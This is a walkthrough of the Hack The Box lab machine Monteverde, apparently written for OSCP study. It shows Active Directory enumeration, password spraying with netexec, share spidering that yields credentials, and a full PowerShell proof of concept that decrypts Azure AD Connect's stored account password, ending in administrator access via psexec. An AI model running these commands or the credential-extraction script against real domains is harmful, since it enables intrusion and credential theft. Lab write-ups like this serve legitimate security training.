---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Monteverde?sort_by=created_at&sort_type=desc
Difficulty: Medium
Featured:
aliases:
  - AD
---

---
# Information / Description

![](../../0.%20Assets/Monteverde-1791286711250.webp)

![328](../../0.%20Assets/Monteverde-1791286726528.webp)
---

# Walkthrough


We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.

First let's find the ports

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts -vvv
```

- `$T` is a variable i created to store the IP of the target machine

We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again

Here you can find the dotfiles for the kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

Once we have the ports, we will do another `nmap` going more in detail

```
nmap $T -Pn -n -sVC --min-rate 5000 -oN results.txt -vvv -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696
```

![](../../0.%20Assets/Monteverde-1791288777615.webp)

Cool, let's add the domain name for correct `kerberos` authentication in out `/etc/hosts` file

```
netexec smb $T
```

![](../../0.%20Assets/Monteverde-1791288836380.webp)

![](../../0.%20Assets/Monteverde-1791288996455.webp)

Let's see if we can do some anonymous enumeration

Anonymous is allowed but no shares shown and/or no user enumeration

![](../../0.%20Assets/Monteverde-1791289237358.webp)

so i moved to other protocols like RCP

```
rpcclient -U '' -N $T
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
rpcclient $> exit
```

And we are allowed to enumerate users, so let's get a list using some `regex`

```
rpcclient -U '' -N "$T" -c 'enumdomusers' | grep -oP 'user:\[\K[^]]+' > users.txt
```

![](../../0.%20Assets/Monteverde-1791289441999.webp)

next logical step is to `as-rep` roast the user.

```
impacket-GetNPUsers 'MEGABANK.LOCAL/' \                           
  -usersfile users.txt \
  -no-pass \
  -dc-ip $T \
  -format hashcat \
  -outputfile asrep-impacket.txt
```

![](../../0.%20Assets/Monteverde-1791289516272.webp)

All of the users requires Preauth so let's try to find credentials

First thing I did was testing if any of the users didn't have a password

```
netexec smb $T -u users.txt -p ''
```

Without success

![](../../0.%20Assets/Monteverde-1791289686628.webp)

I was running out of ideas and I tested `ldapdomaindump` and  recollecting information with `bloodhound-python` with `anonymous` credentials but didn't work, we still need some set of credentials, we have users, we need a password.

So I decided to do something I hate which is `Brute forcing` 

```
netexec smb $T -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success --ignore-pw-decoding
```

This was taking a very long time so I decided to run the list of users against itself

```
netexec smb $T -u users.txt -p users.txt --continue-on-success --ignore-pw-decoding -t 50
```

![](../../0.%20Assets/Monteverde-1791291523487.webp)

Great!!! Let's create a file with the credentials and let's see what we can do with them

```
./nxcspray all $T -u 'SABatchJobs' -p 'SABatchJobs'
```

![](../../0.%20Assets/Monteverde-1791291890724.webp)

cool, let's see if this user has any shares

```
netexec smb $T -u SABatchJobs -p 'SABatchJobs' --shares
```

![](../../0.%20Assets/Monteverde-1791291922071.webp)

Great, let's see what we can find

```
netexec smb $T -u SABatchJobs -p 'SABatchJobs' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
```

![](../../0.%20Assets/Monteverde-1791291984110.webp)

![](../../0.%20Assets/Monteverde-1791292974326.webp)

This looks interesting because that is a known user

![](../../0.%20Assets/Monteverde-1791292989753.webp)

Great!! we have credentials, add them to the credential file

![](../../0.%20Assets/Monteverde-1791294153840.webp)

And test them against all the protocols

```
./nxcspray all $T -u mhope -p '4n0therD4y@n0th3r$'
```

![](../../0.%20Assets/Monteverde-1791294279339.webp)

We have a way in.

```
evil-winrm -i $T -u mhope -p '4n0therD4y@n0th3r$'
```


![](../../0.%20Assets/Monteverde-1791294365066.webp)

	And we have the first flag

Trying to get a reverse shell I encountered this message

![](../../0.%20Assets/Monteverde-1791294767838.webp)

Tried evading it with some techniques but no luck so we either get the information we need without dropping a binary in disk or find it from outside the domain

Let's do some `kerberoasting` and see if we need to jump to another user

![](../../0.%20Assets/Monteverde-1791296036593.webp)

No luck, let's test `ADCS`  

```
nxc ldap $T -d megabank.local -u mhope -p '4n0therD4y@n0th3r$' -M adcs
```

Didn't get much here let's check privileges and stuff

```
whoami /all
```

![](../../0.%20Assets/Monteverde-1791298242015.webp)

That is a strange group after some google searching we find out that that group is related to a service called `Azure AD`

After quite some more google-ing I found this [website](https://blog.xpnsec.com/azuread-connect-for-redteam/)

Where they give this script
```
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

This script reads Azure AD Connect’s local database and uses its cryptographic library to decrypt the stored password for the Active Directory connector account. If it has sufficient access to the database and encryption keys, it prints the domain, username, and plaintext password.

after running it

![](../../0.%20Assets/Monteverde-1791299596839.webp)

```
impacket-psexec MEGABANK.LOCAL/administrator:'d0m@in4dminyeah!'@$T
```

![](../../0.%20Assets/Monteverde-1791299665905.webp)